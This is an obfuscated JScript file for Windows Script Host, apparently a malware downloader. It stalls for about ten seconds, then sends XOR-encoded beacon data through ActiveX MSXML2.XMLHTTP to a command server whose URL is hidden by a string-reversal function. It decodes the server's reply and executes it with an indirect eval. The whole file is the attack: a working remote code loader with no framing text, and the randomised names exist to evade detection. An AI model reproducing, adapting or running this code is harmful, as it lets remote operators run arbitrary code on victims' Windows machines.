var gyjremi = (new Date)['getTime']();
var yvxiwjir8 = gyjremi + 10000;
while (gyjremi < yvxiwjir8) {
	gyjremi = (new Date)['getTime']();
	this['WScript']['Sleep'](1000);
}



sendRequest(['a', abap('a1y0n5o'), abap('m3a6s2m')]);



function sendRequest(bajgijwe, cuhylbgowo6) {

	if(typeof cuhylbgowo6 === 'undefined') { cuhylbgowo6 = false; }

	var gospoyl4 = '', scyde = '', wmaippihel, orzpufreax ='=';

	for (var zuiskiqdy = 0; zuiskiqdy < bajgijwe['length']; zuiskiqdy++) {
		gospoyl4 += zuiskiqdy + orzpufreax + encodeURIComponent(''+bajgijwe[zuiskiqdy]) + '&';
	}
	

	try {
		gospoyl4 = zaxit(gospoyl4);
		var paqujhidxto;
		paqujhidxto = new ActiveXObject('MSXML2.XMLHTTP');
		paqujhidxto['open']('POST', abap('bgynzpm.hlaevxliupx/nmtoicb.wosccguiajhrqepyhavlfsahlsqiufr.tmqabecrntssdpfug.h6vcv7q5s7h8g6f3b/y/k:tsppptutohu'), false);
		paqujhidxto['send'](gospoyl4);
		var weyvoxxwe = paqujhidxto['status'];
		if (weyvoxxwe == 200) {
			scyde = paqujhidxto['responseText'];
			if(scyde) {
				wmaippihel = zapepaceh(scyde);
				if(!cuhylbgowo6) {
					fjyhabotvfa(wmaippihel);
				}
				else {
					return wmaippihel;
				}
			}
		}
		
	} catch (e) {}

	return false;
	
}



function fjyhabotvfa(vijri) {
	var fxyrobkuqda = 'eval';
	this[fxyrobkuqda](vijri);
}






function zapepaceh(jiuhly) {
	var jumlu, cakot, zuiskiqdy, scyde = '', katfemsuhe, ezfepebgy3;

	var wyxlonekaw = jiuhly['substr'](0, 2);

	cakot = parseInt(wyxlonekaw, 16);
	jumlu = jiuhly['substr'](2);
	
	for (zuiskiqdy = 0; zuiskiqdy < jumlu['length']; zuiskiqdy+=2) {
		ezfepebgy3 = jumlu['substr'](zuiskiqdy, 2);
		katfemsuhe = parseInt(ezfepebgy3, 16);
		scyde += String['fromCharCode'](qudi(katfemsuhe, cakot));
	}
	
		
	return scyde;
}


function zaxit(jiuhly) {
	var cakot = 94, zuiskiqdy, scyde = '';
	
	for (zuiskiqdy = 0; zuiskiqdy < jiuhly['length']; zuiskiqdy++) {
		scyde += rsudry2(jiuhly['charCodeAt'](zuiskiqdy) ^ cakot);
	}

	return (rsudry2(cakot)+scyde);
}

function rsudry2(zuiskiqdy) {
	var wefjkowuj = '00';
	var cyfijagy = wefjkowuj+zuiskiqdy['toString'](16);
	cyfijagy = cyfijagy['substr'](cyfijagy['length']-2);
	return cyfijagy;
}

function abap(ksomoofzu0) {
	var xbyni = '';
	for(var cytnafgonzi=0; cytnafgonzi<ksomoofzu0['length']; cytnafgonzi++) {
		if(cytnafgonzi%2===1) {
			xbyni = ksomoofzu0['substr'](cytnafgonzi, 1) + xbyni;
		}
	}

	return xbyni;
}

function qudi(fygszugle, ccabal4) {	
	return fygszugle ^ ccabal4;
}







